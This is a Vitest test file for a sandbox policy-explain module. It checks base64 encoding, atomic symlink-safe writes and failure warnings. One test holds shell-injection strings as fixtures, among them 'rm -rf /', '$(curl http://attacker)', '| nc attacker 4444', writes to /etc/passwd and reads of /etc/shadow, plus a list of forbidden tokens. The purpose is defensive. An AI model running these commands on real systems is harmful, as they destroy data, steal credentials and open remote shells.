// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it, vi } from "vitest";

vi.mock("../../policy/context", () => ({
  buildPolicyContext: vi.fn(),
  renderPolicyContextMarkdown: vi.fn(),
}));

import type { PolicyContext } from "../../policy/context";
import {
  POLICY_CONTEXT_SANDBOX_PATH,
  explainSandboxPolicy,
  writePolicyContextToSandbox,
} from "./policy-explain";

function fakeContext(sandboxName: string): PolicyContext {
  return {
    sandboxName,
    tier: null,
    activePresets: [],
    knownUnappliedPresets: [],
    approvalPath: {
      inspect: `nemoclaw ${sandboxName} policy-list`,
      add: `nemoclaw ${sandboxName} policy-add <preset>`,
      remove: `nemoclaw ${sandboxName} policy-remove <preset>`,
      documentation: "docs/network-policy/customize-network-policy.mdx",
    },
    supportBoundaries: [],
    generatedAt: "2026-06-07T00:00:00.000Z",
  };
}

describe("explainSandboxPolicy", () => {
  it("renders the policy context as markdown by default", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "# rendered\n");
    const log = vi.fn();
    const logJson = vi.fn();
    const exec = vi.fn();

    const ctx = explainSandboxPolicy(
      "alpha",
      {},
      { build, render, log, logJson, exec },
    );

    expect(build).toHaveBeenCalledWith("alpha");
    expect(render).toHaveBeenCalledWith(ctx);
    expect(log).toHaveBeenCalledWith("# rendered\n");
    expect(logJson).not.toHaveBeenCalled();
    expect(exec).not.toHaveBeenCalled();
  });

  it("emits JSON when the json flag is set", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn();
    const log = vi.fn();
    const logJson = vi.fn();
    const exec = vi.fn();

    const ctx = explainSandboxPolicy(
      "alpha",
      { json: true },
      { build, render, log, logJson, exec },
    );

    expect(logJson).toHaveBeenCalledWith(ctx);
    expect(log).not.toHaveBeenCalled();
    expect(render).not.toHaveBeenCalled();
    expect(exec).not.toHaveBeenCalled();
  });

  it("writes the rendered context into the sandbox when writeToSandbox is set", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "# rendered\n");
    const log = vi.fn();
    const logJson = vi.fn();
    const exec = vi.fn((_sandbox: string, _command: string) => ({
      status: 0,
      stdout: "",
      stderr: "",
    }));
    const warn = vi.fn();

    explainSandboxPolicy(
      "alpha",
      { writeToSandbox: true },
      { build, render, log, logJson, exec, warn },
    );

    expect(exec).toHaveBeenCalledTimes(1);
    const command = exec.mock.calls[0][1];
    expect(command).toContain(POLICY_CONTEXT_SANDBOX_PATH);
    expect(command).toContain("base64 -d");
    expect(warn).not.toHaveBeenCalled();
  });

  it("warns when --write cannot reach the sandbox", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "# rendered\n");
    const log = vi.fn();
    const logJson = vi.fn();
    const exec = vi.fn(() => null);
    const warn = vi.fn();

    explainSandboxPolicy(
      "alpha",
      { writeToSandbox: true },
      { build, render, log, logJson, exec, warn },
    );

    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0][0]).toContain("sandbox unreachable");
    expect(warn.mock.calls[0][0]).toContain(POLICY_CONTEXT_SANDBOX_PATH);
  });

  it("warns when --write fails with a non-zero exit", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "# rendered\n");
    const log = vi.fn();
    const logJson = vi.fn();
    const exec = vi.fn(() => ({ status: 13, stdout: "", stderr: "denied" }));
    const warn = vi.fn();

    explainSandboxPolicy(
      "alpha",
      { writeToSandbox: true },
      { build, render, log, logJson, exec, warn },
    );

    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0][0]).toContain("status 13");
  });
});

describe("writePolicyContextToSandbox", () => {
  it("encodes the rendered markdown as base64 and pipes it through base64 -d", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "hello sandbox\n");
    const exec = vi.fn((_sandbox: string, _command: string) => ({
      status: 0,
      stdout: "",
      stderr: "",
    }));

    const result = writePolicyContextToSandbox("alpha", { build, render, exec });

    expect(result.written).toBe(true);
    expect(exec).toHaveBeenCalledTimes(1);
    const command = exec.mock.calls[0][1];
    const encoded = Buffer.from("hello sandbox\n", "utf-8").toString("base64");
    expect(command).toContain(encoded);
    expect(command).toContain(POLICY_CONTEXT_SANDBOX_PATH);
  });

  it("stages the payload in a sibling temp file and atomically replaces the target without following symlinks", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "payload\n");
    const exec = vi.fn((_sandbox: string, _command: string) => ({
      status: 0,
      stdout: "",
      stderr: "",
    }));

    writePolicyContextToSandbox("alpha", { build, render, exec });

    const command = exec.mock.calls[0][1];
    // Payload must land in a freshly-minted temp file under the workspace
    // directory before any rename — never written directly to the final
    // path.
    expect(command).toContain("mktemp /sandbox/.openclaw/workspace/.POLICY.md.XXXXXX");
    // The atomic replace must use rename(2) semantics — `mv -fT` operates
    // on the link itself rather than the target of a symlink, so a
    // pre-existing POLICY.md symlink is replaced, never followed.
    expect(command).toMatch(/mv -fT -- "\$__pm_tmp" \/sandbox\/\.openclaw\/workspace\/POLICY\.md/);
    // The legacy direct-redirect-into-target form must not appear — that
    // form would write through a pre-existing symlink and is the failure
    // mode this contract guards against.
    expect(command).not.toMatch(/> \/sandbox\/\.openclaw\/workspace\/POLICY\.md/);
  });

  it("returns sandbox-unreachable when exec yields null", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "x");
    const exec = vi.fn(() => null);

    const result = writePolicyContextToSandbox("alpha", { build, render, exec });

    expect(result.written).toBe(false);
    expect(result.reason).toBe("sandbox unreachable");
    expect(result.failure).toBe("sandbox-unreachable");
  });

  it("returns a descriptive reason when the sandbox command exits non-zero", () => {
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => "x");
    const exec = vi.fn(() => ({ status: 13, stdout: "", stderr: "denied" }));

    const result = writePolicyContextToSandbox("alpha", { build, render, exec });

    expect(result.written).toBe(false);
    expect(result.reason).toContain("status 13");
    expect(result.reason).toContain("denied");
  });

  it("encodes hostile markdown payloads as base64 so they cannot break out of the write command", () => {
    const hostile = [
      "'; rm -rf / #",
      "$(curl http://attacker)",
      "`whoami`",
      "| nc attacker 4444",
      "> /etc/passwd",
      "&& shutdown -h now",
      "\n; cat /etc/shadow",
      "newline\r\nthen evil",
      "$IFS$9 sh -c 'curl evil'",
    ].join("\n");
    const build = vi.fn(fakeContext);
    const render = vi.fn(() => hostile);
    const exec = vi.fn((_sandbox: string, _command: string) => ({
      status: 0,
      stdout: "",
      stderr: "",
    }));

    writePolicyContextToSandbox("alpha", { build, render, exec });

    const command = exec.mock.calls[0][1];
    const encoded = Buffer.from(hostile, "utf-8").toString("base64");
    expect(command).toContain(encoded);
    // The hostile payload itself must never appear verbatim in the shell
    // command — only its base64 encoding may appear.
    for (const token of [
      "rm -rf",
      "curl http://attacker",
      "whoami",
      "nc attacker",
      "/etc/passwd",
      "shutdown -h",
      "/etc/shadow",
      "evil",
    ]) {
      expect(command).not.toContain(token);
    }
    // The constant target path is the only path interpolated into the
    // command — guard against future regressions that swap it for a
    // variable.
    expect(command).toContain(POLICY_CONTEXT_SANDBOX_PATH);
    const occurrences = command.split(POLICY_CONTEXT_SANDBOX_PATH).length - 1;
    expect(occurrences).toBeGreaterThanOrEqual(1);
  });
});
